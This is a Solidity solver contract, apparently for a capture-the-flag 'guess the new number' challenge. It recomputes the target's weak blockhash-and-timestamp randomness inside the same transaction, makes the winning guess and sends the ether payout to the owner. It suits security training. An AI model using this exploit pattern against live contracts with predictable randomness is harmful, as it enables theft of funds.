// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

interface IChallenge{
    function guess(uint8 n) external payable;

}

contract GuessTheNewNumberSolver {

    address owner;
    IChallenge challenge;
    
    constructor(address _challenge) payable {
        // require(msg.value == 1 ether);
        challenge = IChallenge(_challenge);
        owner = msg.sender;
    }

    function solve () external payable {

        require(msg.value == 1 ether);

        uint8 answer = uint8(
            uint256(  
                keccak256( abi.encodePacked(
                    blockhash(block.number - 1), block.timestamp)
                )
            )
        );  

        challenge.guess{value: 1 ether}(answer);

        payable(owner).transfer(2 ether);

    }

    receive() external payable {
    }
    
}